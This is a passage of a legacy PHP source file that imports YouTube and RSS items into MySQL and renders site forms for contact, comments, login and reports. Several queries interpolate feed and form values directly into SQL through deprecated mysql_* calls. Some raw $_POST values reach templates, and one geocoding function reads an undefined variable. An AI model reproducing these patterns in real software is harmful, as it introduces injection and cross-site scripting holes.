if ($to_delete) delete_items('v',$to_delete);
dq("update $s[pr]cats set last_cleaning = '$s[cas]' where n = '$n'",1);
}

##################################################################################

function youtube_import($category_vars) {
global $s,$youtube,$youtube_array_counter;
$youtube_array_counter = 0;
if ((!$category_vars[n]) OR (!$category_vars[youtube_keywords])) return false;

if ($category_vars[last_cleaning]<($s[cas]-345600)) clean_video_category($category_vars[n]);

$url = "http://gdata.youtube.com/feeds/api/videos?vq=".urlencode($category_vars[youtube_keywords])."&max-results=20&orderby=published";
//$url = "http://gdata.youtube.com/feeds/api/users/".urlencode($category_vars[youtube_keywords])."/uploads?alt=rss&v=2&orderby=published&client=ytapi-youtube-profile";
//echo "$url<br>";
//$str = htmlspecialchars_decode(stripslashes(fetchURL($url)));
$str = htmlspecialchars_decode(stripslashes(fetchURL($url)));

$items = explode('<entry>',$str); unset($items[0]);
//$items = explode('<item>',$str); unset($items[0]);
//if (strstr($data,'<ut_response status="fail">')) { echo 'YOUTUBE ERROR: '.strip_tags($data); return false; }!!!!!!!!!!
foreach ($items as $kkk=>$item)
{ //echo htmlspecialchars($item);
  unset($a);
  /*
  preg_match("/<yt:videoid>(.+)<\/yt:videoid>/is",$item,$b); $a[youtube_id] = trim($b[1]);
  preg_match("/<title(.+)<\/title>/is",$item,$b); $a[title] = trim(str_replace('>','',strrchr($b[1],'>')));
  preg_match("/<media:description type='plain'>(.+)<\/media:description>/is",$item,$b); $a[description] = trim(str_replace(',',', ',strip_tags($b[1])));
  preg_match("/<author>(.+)<\/author>/is",$item,$b); $a[author_name] = trim($b[1]);
  preg_match("/(seconds=\'[0-9]+)/s",$item,$b); $a[length] = str_replace("seconds='",'',$b[1]);
  preg_match("/<atom:updated>(.+)<\/atom:updated>/is",$item,$b); $published = $b[1]; $x = explode('T',$published); $x = explode('-',$x[0]); $a[published] = get_timestamp($x[2],$x[1],$x[0],'start');
  if ($s[v_max_description_chars]) $a[description] = my_substr($a[description],$s[v_max_description_chars]);
*/

  preg_match("/<id>(.+)<\/id>/is",$item,$b); $a[youtube_id] = trim(str_replace('/','',strrchr($b[1],'/')));
  preg_match("/<title(.+)<\/title>/is",$item,$b); $a[title] = trim(str_replace('>','',strrchr($b[1],'>')));
  preg_match("/<content(.+)<\/content>/is",$item,$b); $a[description] = trim(str_replace(',',', ',str_replace('>','',strrchr($b[1],'>'))));
  preg_match("/<author>(.+)<\/author>/is",$item,$b); $author_section = $b[1]; preg_match("/<name>(.+)<\/name>/is",$author_section,$b); $a[author_name] = $b[1];
  preg_match("/(seconds=\'[0-9]+)/s",$item,$b); $a[length] = str_replace("seconds='",'',$b[1]);
  preg_match("/<published>(.+)<\/published>/is",$item,$b); $published = $b[1]; $x = explode('T',$published); $x = explode('-',$x[0]); $a[published] = get_timestamp($x[2],$x[1],$x[0],'start');
  preg_match("/<media:keywords>(.+)<\/media:keywords>/is",$item,$b); $a[keywords] = trim($b[1]);
  
  if ($s[v_max_description_chars]) $a[description] = my_substr($a[description],$s[v_max_description_chars]);
  if ((function_exists('iconv')) AND ($s[charset]!='')) foreach ($a as $k2=>$v2) $a[$k2] = iconv('UTF-8',$s[charset],$v2);
  $a[thumbnail_url] = "http://img.youtube.com/vi/$a[youtube_id]/1.jpg";
  $a = replace_array_text($a);
  //foreach ($a as $k1=>$v1) echo "$k1 - $v1<br>\n"; //exit;
  //echo '<br><br><br>';
  if (!$a[title]) continue;
  
  $q = dq("SELECT n FROM $s[pr]videos WHERE youtube_id = '$a[youtube_id]'"); $x = mysql_num_rows($q); if ($x) continue;
  $password = get_random_password($a[title],$a[description],$category_vars[n]);
  $rewrite_url = discover_rewrite_url($a[title],0,'v');
  $keywords_array = explode(',',trim($a[keywords])); foreach ($keywords_array as $k=>$v) { $v = trim($v); if (strlen($v)<3) unset($keywords_array[$k]); else $keywords_array[$k] = $v; }
  $a[keywords] = implode("\n",$keywords_array);
  $map_test = test_google_map($a[map]);
  dq("insert into $s[pr]videos values(NULL,'$a[title]','$a[description]','$a[keywords]','','$a[map]$map_test','_$category_vars[n]_','$category_vars[path_n]','$a[author_name]','$s[mail]','$user_number','$a[published]',0,'$password','0',0,'$a[youtube_id]','$a[length]','$a[thumbnail_url]','$a[video_code]','0','0','0','0','0','$t1','$t2','enabled','1','$rewrite_url')",1);
  $n = mysql_insert_id();
  update_item_index('v',$n);
  if ($s[video_download_thumbnails]) video_download_thumbnail($n,$a[thumbnail_url]);
  //exit;
}
if ($category_vars[max_items]) delete_oversize_items('v',$category_vars);
recount_items_cat('v',$category_vars[n]);
dq("update $s[pr]cats set last_import = '$s[cas]' where n = '$category_vars[n]'",1);
}

##################################################################################

function video_download_thumbnail($n,$thumbnail_url) {
global $s;
$our_path = "$s[phppath]/images/videos/thumbnail_$n.jpg";
$our_url = "$s[site_url]/images/videos/thumbnail_$n.jpg";
$img = imagecreatefromjpeg($thumbnail_url);
imagejpeg($img,$our_path);
if (file_exists($our_path)) dq("update $s[pr]videos set youtube_thumbnail = '$our_url' where n = '$n'",1);
}

##################################################################################

function characterData($parser,$data) {
global $youtube,$youtube_array_counter,$youtube_index;
if ($youtube_index != "") $youtube[$youtube_array_counter][$youtube_index] .= trim($data);
}

#############################################################################

function rss_news_import($category_vars,$items) {
global $s;
if ($s[n_delete_imported_days]) $t2 = $s[cas] + ($s[n_delete_imported_days] * 86400); else $t2 = 0;
$en_cats = has_some_enabled_categories('n',$category_vars[n]);

require_once("$s[phppath]/rss_reader.php");
$rss = clsRSS($category_vars[rss_url],$s[charset],$items);

foreach ($rss as $k=>$item)
{ $b[url] = strip_tags(refund_html($item[url]));
  $b[title] = strip_tags(refund_html($item[title]));
  //$b[description] = strip_tags(refund_html($item[description]));
  $b[detail] = refund_html($item[description]);
  $b[image] = strip_tags($item[image]);
  $keywords_array = explode(' ',trim($b[title])); foreach ($keywords_array as $k=>$v) { $v = trim($v); if (strlen($v)<3) unset($keywords_array[$k]); else $keywords_array[$k] = $v; }
  $b[keywords] = implode("\n",$keywords_array);
  if (strstr($b[url],'http://news.google.com/news/')) $q = dq("select n from $s[pr]news where title = '$b[title]' and c = '_$category_vars[n]_'",1);
  else $q = dq("select n from $s[pr]news where url = '$b[url]' and c = '_$category_vars[n]_'",1);
  $x = mysql_fetch_assoc($q); if ($x[n]) continue;
  if (!$s[rss_allow_html]) $b[detail] = strip_tags($b[detail],"<img>"); $b[detail] = str_replace('<img','<img style="padding:5px;"',$b[detail]);
  $rewrite_url = discover_rewrite_url($b[title],0,'n');
  $password = get_random_password($b[title],$b[description]);
  $b[keywords] = prepare_keywords($b[keywords]);
  //$map_test = test_google_map($b[map]);
  dq("insert into $s[pr]news values(NULL,'$b[url]','$b[title]','$b[description]','$b[detail]','$b[keywords]','','$b[map]$map_test','_$category_vars[n]_','$category_vars[path_n]','0','Import','$s[mail]','$s[cas]',0,'$password','0',0,'0','0','0','0','0','0','$t2','enabled','$en_cats','$rewrite_url')",1);
  $n = mysql_insert_id();
  update_item_index('n',$n);
  
  if ($b[image])
  { $x = explode('.',$b[image]); $x1 = count($x)-1; $extension = $x[$x1];
    dq("insert into $s[pr]files values(NULL,'n','$n','0','1','$b[image]','$image_description[$file_n]','image','$extension','0')",1);
	dq("update $s[pr]news set picture = '$b[image]' where n = '$n'",1);
  }

}
if ($category_vars[max_items]) delete_oversize_items('n',$category_vars);
recount_items_cat('n',$category_vars[n]);
dq("update $s[pr]cats set last_import = '$s[cas]' where n = '$category_vars[n]'",1);
}

##################################################################################

function delete_oversize_items($what,$category_vars) {
global $s;
if (!$category_vars[max_items]) return false;
$where = get_where_fixed_part('',$category_vars[n],0,$s[cas]);
$table = $s[item_types_tables][$what];
$q = dq("select count(*) from $table where $where",1);
$count = mysql_fetch_row($q);
if ($count[0]<=$category_vars[max_items]) return false;
$items_to_delete = $count[0] - $category_vars[max_items];
$q = dq("select n from $table where $where order by created limit $items_to_delete",1);
while ($x=mysql_fetch_assoc($q)) $items[] = $x[n];
delete_items($what,$items);
}

##################################################################################
##################################################################################
##################################################################################

function mail_from_template($t,$vl) {
global $s,$m;
//foreach ($vl as $k=>$v) echo "$k - $v<br />";
$vl[charset] = $s[charset]; $vl[site_url] = $s[site_url]; $vl[currency] = $s[currency]; $vl[ip] = $s[ip];
if (file_exists($s[phppath].'/styles/'.$s[LUG_style].'/email_templates/'.$t)) $t = $s[phppath].'/styles/'.$s[LUG_style].'/email_templates/'.$t;
else $t = $s[phppath].'/styles/_common/email_templates/'.$t;
$emailtext = implode('',file($t)) or die("Unable to read template $t");
preg_match("/Subject: +([^\n\r]+)/i",$emailtext,$regs); $subject = $regs[1];
$subject = str_replace('HTML_EMAIL','',$subject); if ($subject!=$regs[1]) $htmlmail = 1;
$emailtext = preg_replace("/Subject: +([^\n\r]+)[\r\n]+/i",'',$emailtext);
foreach ($vl as $k=>$v) { $emailtext = str_replace("#%$k%#",$v,$emailtext); $subject = str_replace("#%$k%#",$v,$subject); }
$emailtext = preg_replace("/#%[a-z0-9_]*%#/i",'',$emailtext);
$emailtext = str_replace('&amp;','&',unreplace_once_html($emailtext)); $subject = unreplace_once_html($subject);
if (!$vl[to]) $vl[to] = $s[mail];
if (!$vl[from]) $vl[from] = $s[mail];
//echo "($vl[from],'',$vl[to],$htmlmail+$s[htmlmail],$subject,$emailtext,1)";
my_send_mail($vl[from],'',$vl[to],$htmlmail+$s[htmlmail],$subject,$emailtext,1);
}

########################################################################################

function multicolumns_table($cells_array,$columns,$sort_in_rows,$parse_part_f,$fill_template,$style) {
global $s;
$pocet = count($cells_array); $rows = ceil($pocet/$columns);
for ($x=$pocet+1;$x<=($rows*$columns);$x++)
{ $cells_array[] = $parse_part_f($fill_template,$style,$xxx);
  $pocet++;
}
if ($sort_in_rows==1)
{ for ($x=1;$x<=$rows;$x++)
  { $a .= '<tr>';
    for ($y=($x-1)*$columns;$y<=$x*$columns-1;$y++) $a .= $cells_array[$y];
    $a .= '</tr>';
  }
}
else
{ for ($x=1;$x<=$rows;$x++)
  { $a .= '<tr>';
    for ($y=$x-1;$y<=$pocet-1;$y=$y+$rows) $a .= $cells_array[$y];
    $a .= '</tr>';
  }
}
return $a;
}

########################################################################################

function test_google_map($google_map) {
global $s;
if (!trim($google_map)) return false;
$address = "http://maps.googleapis.com/maps/api/geocode/xml?sensor=false&address=".urlencode($google_map);
$page = fetchURL($address);

if (trim($page))
{ preg_match("/(<location>)(.*)(<\/location>)/is",$page,$x); 
  preg_match("/(<lat>)(.*)(<\/lat>)/is",$x[2],$x1); $latitude = $x1[2];
  preg_match("/(<lng>)(.*)(<\/lng>)/is",$x[2],$x1); $longitude = $x1[2];
  //foreach ($a as $k => $v) echo "$k --- $v[short_name] --- $v[long_name]<br><br>";
  //exit;
  $a[latitude] = $b[latitude];
  $a[longitude] = $b[longitude];
}
if (($longitude) AND ($latitude)) return '_gmok_';
}

########################################################################################

function notes_edit_box($what,$n,$info) {
global $s,$m;
include_once("$s[phppath]/data/data_forms.php");
if (isset($s[current_notes])) $a[notes] = $s[current_notes];
else
{ $q = dq("select * from $s[pr]u_private_notes where user = '$s[LUG_u_n]' AND what = '$what' AND n = '$n'",1);
  $a = mysql_fetch_assoc($q);
}
$a[what] = $what; $a[n] = $n;
if (trim($info)) $a[info] = $info;
return parse_part('notes_form.txt',$a);
}

########################################################################################

function report_box($what,$n,$error,$hide_cancel) {
global $s,$m;
include_once("$s[phppath]/data/data_forms.php");
if ($_POST[hide_cancel]) $hide_cancel = 1;
$a = replace_array_text($_POST);
$a[what] = $what; $a[n] = $n;
if ($s[report_captcha]) $a[field_captcha_test] = parse_part('form_captcha_test.txt',$a);
if (trim($error)) $a[info] = $error;
if ($hide_cancel) { $a[hide_cancel] = '1'; $a[hide_cancel_begin] = '<!--'; $a[hide_cancel_end] = '-->'; }
return parse_part('report.txt',$a);
}

########################################################################################

function tell_friend_box($what,$n,$error,$hide_cancel) {
global $s,$m;
include_once("$s[phppath]/data/data_forms.php");
if ($_POST[hide_cancel]) $hide_cancel = 1;
$in = replace_array_text($_POST);
if (is_numeric($n))
{ if ($what=='c')
  { $a = get_category_variables($n);
    $a[title] = "$s[site_name] - $a[title]";
    $a[url] = category_url($a[use_for],$in[category],$a[alias_of],$a[name],1,$a[pagename],$a[rewrite_url],'','');
  }
  else
  { if ($what=='l') $a = get_item_variables('l',$n);
    elseif ($what=='a') $a = get_item_variables('a',$n);
    elseif ($what=='b') $a = get_item_variables('b',$n);
    elseif ($what=='n') $a = get_item_variables('n',$n);
    elseif ($what=='v') $a = get_item_variables('v',$n);
    if ($a[n]) $a[url] = get_detail_page_url($what,$a[n],$a[rewrite_url],'',1);
  }
}
if (!$a[n]) { $a[title] = $s[site_name]; $a[url] = $s[site_url]; }
$a[name] = $in[name]; $a[email] = $in[email]; $a[friend_email] = $in[friend_email]; $a[message] = $_POST[message];
$a[what] = $what; $a[n] = $n;
if ($s[tell_friend_captcha]) $a[field_captcha_test] = parse_part('form_captcha_test.txt',$a);
if (trim($error)) $a[info] = $error;
if ($hide_cancel) { $a[hide_cancel] = '1'; $a[hide_cancel_begin] = '<!--'; $a[hide_cancel_end] = '-->'; }
if ($a[n]) return parse_part('tell_friend_item.txt',$a);
else return parse_part('tell_friend_site.txt',$a);
}

########################################################################################

function enter_comment_box($what,$n,$error) {
global $s,$m;
include_once("$s[phppath]/data/data_forms.php");
$a = replace_array_text($_POST);
$a[what] = $what; $a[n] = $n;
$in[name] = $a[name]; $in[email] = $a[email];
if ($s[comm_v_name]) { $x[item_name] = $m[name]; $x[field_name] = 'name'; $x[field_value] = $in[name]; $x[field_maxlength] = 255; $a[field_name] = parse_part('form_field.txt',$x); }
if ($s[comm_v_email]) { $x[item_name] = $m[email]; $x[field_name] = 'email'; $x[field_value] = $in[email]; $x[field_maxlength] = 255; $a[field_email] = parse_part('form_field.txt',$x); }
if ($s[comm_v_captcha]) $a[field_captcha_test] = parse_part('form_captcha_test.txt',$s);
if (trim($error)) $a[info] = $error;
return parse_part('comment_form.txt',$a);
}

########################################################################################

function user_login_form() {
global $s,$m;
$a = replace_array_text($_POST);
$in[username] = $a[username]; $in[password] = $a[password];
if ($s[user_login_captcha]) $in[display_captcha_tr] = 'table-row'; else $in[display_captcha_tr] = 'none';
if (!$s[html_rebuild]) $in[info] = $s[info];
return stripslashes(parse_part('user_login_form.txt',$in));
}

########################################################################################

function contact_box($what,$n,$error,$hide_cancel) {
global $s,$m;
include_once("$s[phppath]/data/data_forms.php");
if ($_POST[hide_cancel]) $hide_cancel = 1;
$in = replace_array_text($_POST);
if (is_numeric($n))
{ if ($what=='l') $a = get_item_variables('l',$n);
  elseif ($what=='a') $a = get_item_variables('a',$n);
  elseif ($what=='b') $a = get_item_variables('b',$n);
  elseif ($what=='n') $a = get_item_variables('n',$n);
  elseif ($what=='v') $a = get_item_variables('v',$n);
  elseif ($what=='u') $a = get_user_variables($n);
  $need_captcha = $s[message_owner_captcha];
//  if ($a[n]) $a[url] = get_detail_page_url($what,$a[n],$a[rewrite_url],'',1);
}
if (!$a[n]) { $a[title] = $s[site_name]; $a[url] = $s[site_url]; $need_captcha = $s[message_to_us_captcha]; }
$a[name] = $in[name]; $a[email] = $in[email]; $a[message] = $_POST[message];
$a[what] = $what; $a[n] = $n;
if ($need_captcha) $a[field_captcha_test] = parse_part('form_captcha_test.txt',$a);
if (trim($error)) $a[info] = $error;
if ($hide_cancel) { $a[hide_cancel] = '1'; $a[display_cancel] = 'none'; $a[hide_cancel_begin] = '<!--'; $a[hide_cancel_end] = '-->'; } else $a[display_cancel] = 'inline';
if ($a[n]) return parse_part('contact_form_user.txt',$a);
else return parse_part('contact_form_site.txt',$a);
}

########################################################################################

function claim_listing_box($what,$n,$info) {
global $s,$m;
include_once("$s[phppath]/data/data_forms.php");
$a[n] = $n;
if (trim($info)) $a[info] = $info;
return parse_part('claim_listing_form.txt',$a);
}

########################################################################################

function suggest_category_box($n,$error) {
global $s,$m;
include_once("$s[phppath]/data/data_forms.php");
if ($_POST[hide_cancel]) $hide_cancel = 1;
$in = replace_array_text($_POST);
$need_captcha = $s[message_to_us_captcha];
$a[suggest_form_name] = $in[suggest_form_name]; $a[suggest_form_email] = $in[suggest_form_email]; $a[suggest_form_subcategory] = $in[suggest_form_subcategory]; $a[message] = $_POST[message];
$a[what] = $what; $a[n] = $n;
if ($need_captcha) $a[field_captcha_test] = parse_part('form_captcha_test.txt',$a);
if (trim($error)) $a[info] = $error;
return parse_part('category_suggest.txt',$a);
}

########################################################################################
########################################################################################
########################################################################################

?>